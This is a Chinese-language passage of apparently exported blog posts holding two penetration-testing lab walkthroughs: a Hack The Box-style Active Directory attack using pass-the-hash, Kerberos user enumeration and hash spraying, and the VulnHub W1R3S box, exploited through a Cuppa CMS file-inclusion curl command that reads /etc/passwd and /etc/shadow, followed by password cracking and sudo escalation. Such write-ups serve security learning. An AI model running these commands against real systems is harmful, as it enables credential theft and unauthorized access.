Evil-WinRM是一款基于Ruby编写的Windows远程管理工具，它通过WinRM协议进行连接和交互。WinRM是Microsoft提供的一种远程管理协议，可以在Windows操作系统上实现远程执行命令、传输文件等操作，类似于SSH协议在Linux系统上的作用。 其中： “-i htb.local”指定要连接的目标主机为”htb.local”，即目标主机的主机名或IP地址。 “-u administrator”指定要使用的用户名为”administrator”，即需要连接到目标主机的账户名。 “-H ‘2b576acbe6bcfda7294d6bd18041b8fe’”指定连接目标主机时要使用的密码散列值。这里使用了NTLM hash值，用于身份验证和权限提升等操作。 这条命令的作用是使用Evil-WinRM工具连接到指定的目标主机，并使用指定的用户名和密码散列值进行身份验证。如果验证成功，可以使用工具提供的交互式命令行终端执行命令或进行其他操作，例如上传或下载文件，执行PowerShell脚本等。 从结果表明，并不清楚主机htb.local对应的用户 与密码散列值，因此我们要对user_hash_raw里面的数据进行提取，将用户名提取出来存放在user_list中，将密码散列值存放在user_hash中 对应的提取命令为 123sudo cat user_hash_raw | grep &#x27;:::&#x27; | awk /F &#x27;:&#x27; &#123;print$1&#125; &gt; user_listsudo cat user_hash_raw | grep &#x27;:::&#x27; | awk /F &#x27;:&#x27; &#123;print$3,$4&#125; | sed &#x27;s/ /:/g&#x27; &gt; user_hash#含有:::字符串的行所需要的内容 每个用户账户信息的末尾通常有三个冒号&quot;:::&quot;，这是为了填充该用户的密码字段。 此时有个问题，那就是user_list 与user_hash都有2000行数据，如果直接用这些内容进行碰撞的话，那么效率会比较低下，此时可利用kerbrute对user验证（通过88端口），也可以利用nmap。 使用userenum模块对htb.local域中的用户进行枚举，并使用--dc参数指定域控制器的主机名或IP地址为htb.local，user_list则是一个包含要枚举的用户名列表的文本文件。 -6 指定 Nmap 应使用 IPv6 协议而不是 IPv4。 -p88 指定 Nmap 应扫描 TCP 端口 88，也就是 Kerberos 认证服务的默认端口。 --script=krb5-enum-users 指定 Nmap 应使用 krb5-enum-users 脚本来扫描目标系统，以便枚举 Kerberos 认证服务中存在的用户帐户。 --script-args krb5-enum-users.realm=&#39;htb.local&#39;,userdb=user_list 提供脚本所需的参数。其中 krb5-enum-users.realm=&#39;htb.local&#39; 指定 Kerberos 域名为 “htb.local”，userdb=user_list 指定用户列表文件的名称为 “user_list”。 htb.local 是要扫描的目标系统的名称或 IP 地址。 结果表明存在三个用户 在扫描结果中出现 APT$@htb.local 的情况通常是指在 Kerberos 认证服务中发现了一个服务帐户。在 Kerberos 中，服务帐户的名称通常以 $ 符号结尾，这样可以将它们与普通用户帐户区分开来。APT 是服务帐户的名称，htb.local 是域名。 服务帐户是用于运行服务或应用程序的帐户，它们通常拥有特定的权限和访问控制。在一些情况下，攻击者可以利用已知的服务帐户漏洞来提升其权限或执行攻击，因此服务帐户的安全性也非常重要。 Crackmapexec碰撞 CrackMapExec (CME) 是一款强大的渗透测试工具，用于自动化身份验证、口令破解、权限提升等任务，可帮助渗透测试人员快速地检测和利用网络中存在的安全漏洞。 该工具支持多种操作系统，包括Windows、Linux和Mac OS X等，并支持多种协议，如 SMB、LDAP、HTTP 等。其核心功能包括： 自动化的密码破解：CrackMapExec 可以自动化地枚举和破解用户口令，并支持使用字典和暴力破解等多种方式。 用户权限提升：该工具可以通过利用漏洞提升用户权限，获取更高的访问权限。 横向移动：CrackMapExec 可以在不同的主机之间进行横向移动，以便在目标网络中自由移动和扩展攻击面。 在正常碰撞几次之后出现timed out 报错，再次输入命令则直接无结果显示，推测出目标主机有一定的防护措施（如：失败几次登陆之后锁定） 域用户hash碰撞getTGT Kerberos实际上是一种基于票据（Ticket）的认证方式。客户端要访问服务器的资源，需要首先购买服务端认可的票据。也就是说，客户端在访问服务器之前需要预先买好票，等待服务验票之后才能入场。在这之前，客户端需要先买票，但是这张票不能直接购买，需要一张认购权证。客户端在买票之前需要预先获得一张认购权证。这张认购权证和进入服务器的入场券均有KDC发售。 过程中涉及到的专有名词有： KDC(Key Distribution Center) : 密钥分发中心KAS(Kerberos Authentication Service) : kerberos认证服务TGT(Ticket Granting Ticket) : 认购权证TGS(Ticket Granting Service) : 票据授予服务ST(Service Ticket) : 服务票据 获取TGT客户端要先拿到TGT，然后才能购买ST进行对应服务的访问 过程：首先在用户登陆时，Kerberos服务向KDC(域控)发送申请认购权证的请求，内容为登录输入的用户名和经过输入密码加密的Authenticator(用于确认身份的) KDC(域控)拿到传来的数据后，会根据用户名到活动目录(Active Directory)的数据库中寻找该用户的密码，然后使用该密码解密加密的Authenticator，然后与原始的Authenticator对比，如果一致，则确认用户身份。 KDC(域控)确认登录用户身份正确后，先生成一个由用户密码加密的加密Logon Session Key（为了确保通信安全）。然后生成TGT(包含用户信息和原始Logon Session Key)，再使用KDC的密钥（即krbrgt用户的密钥）加密TGT生成加密后的TGT。然后将由用户密码加密的加密Logon Session Key和加密后的TGT返回给客户端 客户端拿到加密Logon Session Key和TGT后，先用自己的密码解密加密Logon Session Key得到原始Logon Session Key，然后将原始Logon Session Key和TGT缓存到本地 1getTGT.py htb.local/henry.vinson@htb.local -hashes 哈希值 其中，“htb.local&#x2F;henry.vinson@htb.local”是目标Kerberos域和用户的身份，而“哈希值”是使用NTLM哈希算法生成的用户密码的哈希值。此脚本通常用于破解NTLM哈希值并生成TGT，以便在渗透测试或攻击中进行身份验证。 while循环 第一部分“IFS&#x3D;’’ read -r LINE”表示读取名为“hash_list”的文件中的一行，并将其赋值给变量“LINE”。此外，将IFS设置为空字符串（即将分隔符设置为空格字符），以便处理行中的多个字段。 第二部分“|| [ -n “${LINE}” ]”表示当第一部分无法读取新行时（文件结束），则退出循环，否则继续循环。这是通过检查变量“LINE”的值是否为空来实现的。如果“LINE”为空，则意味着已经读取到了文件的末尾，循环将退出；否则，循环将继续，读取下一行数据并执行循环体中的命令。 由于成功取回TGT会生成ccache文件，通过以下命令对目录内容进行监视 1watch &quot;ls -ltr | tail -2&quot; 当能够获得TGT时，即对应的用户名和hash是匹配的","categories":[],"tags":[]},{"title":"","slug":"W1R3S","date":"2023-04-08T12:47:51.647Z","updated":"2023-03-10T15:48:09.227Z","comments":true,"path":"2023/04/08/W1R3S/","link":"","permalink":"http://ljx-go.top/2023/04/08/W1R3S/","excerpt":"","text":"靶场介绍靶机名：W1R3S 靶机地址：https://www.vulnhub.com/entry/w1r3s-101,220/ 下载地址：下载（镜像）：https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip 描述：你被雇来对W1R3S做渗透测试。公司个人服务器并报告所有发现。他们要求您获得root权限并找到标志(位于&#x2F;root目录中)。 目标：得到root权限&amp;找到flag.txt 信息收集1.主机发现 开启靶机后用nmap扫描发现靶机ip sudo nmap -sn 192.168.37.0/24 （不知道具体ip可以通过关闭靶机前后分别扫描） ip地址为 192.168.37.137 2.端口扫描 sudo nmap --min-rate 10000 -p- 192.168.37.137 设置–min-rate参数确保扫得全and准确 识别端口相关信息 sudo nmap -sT -sV -O -p21,22,80,3306 192.168.37.137 -sT用TCP协议 -sV获得对应服务的版本信息 -O获得主机信息 sudo nmap -sU -p21,22,80,3306 192.168.37.137 -sU用udp协议 (往往开发人员忽略了UDP协议) 4个端口侧重点：80&gt;21&gt;3306&gt;22 其中ssh服务 一般是通过暴力破解password 所以为最不可能一项 sudo nmap --script=vuln -p21,22,80,3306 192.168.37.137 利用nmap自带的漏洞扫描对端口进行扫描 从结果得知21 22端口没有信息 80端口中web服务框架为wordpress 是重点突破的地方 MAC地址显示VMware 如果是在真实环境中获得的，宿主环境很可能是window系统 ftp测试ftp是否允许匿名登陆FTP（匿名登录）未授权访问漏洞 FTP的匿名登录一般有三种：1、 用户名：anonymous 密码：Email或者为空2、 用户名：FTP 密码：FTP或者为空3、 用户名：USER 密码：pass 成功匿名登陆 注！！！ ftp登陆后 需要输入binary切换一下 原因ftp 默认为ascii获取文件内容，当获取的文件为可执行文件时，不输入binary则可能会损坏可执行文件 ftp文件下载命令 wget +文件名 其中 employee-names.txt涉及一些敏感信息泄露 可能对于后续有用 Web服务访问页面 前面得知它是一个wordpress框架，通过目录爆破获得对应框架的路径 目录爆破利用feroxbuster及kali自带字典进行爆破 路径：/usr/share/seclists/ kali系统自带字典wordlists简介 feroxbuster -u http://192.168.37.137 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 扫描结果 其中wordpress 与 administrator目录 Cuppa CMS先访问http://192.168.37.137/administrator 获得一个CMS安装界面 点击next后出现注册信息 随意填写再次点击next后安装失败 提示没有Administrator权限 此路不通 用searchsploit搜索cuppa cms相关漏洞 【网安神器篇】——searchsploit漏洞利用搜索工具 查询到相关漏洞描述文件 并用-m参数将一个漏洞利用镜像（副本）到当前工作目录(后面跟漏洞ID号) get传参访问 没有结果 由于$_REQUEST可以用post传参 所以用curl尝试post传参 curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.37.137/administrator/alerts/alertConfigField.php 成功获得&#x2F;etc&#x2F;passwd内容 Linux &#x2F;etc&#x2F;passwd内容解释 尝试查看&#x2F;etc&#x2F;shadow文件 Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.37.137/administrator/alerts/alertConfigField.php 将&#x2F;etc&#x2F;shadow中三个较长的信息收集在一个txt文件内 用john破解 获得其中两个用户的账号密码，很明显可以看出w1r3s权限更高些 利用账号密码ssh远程登陆 成功getshell 查询权限 sudo -l 显示了允许当前用户使用的命令 利用sudo提权 sudo /bin/bash 获得flag.txt 结束本次靶机的练习","categories":[],"tags":[]}],"categories":[],"tags":[]}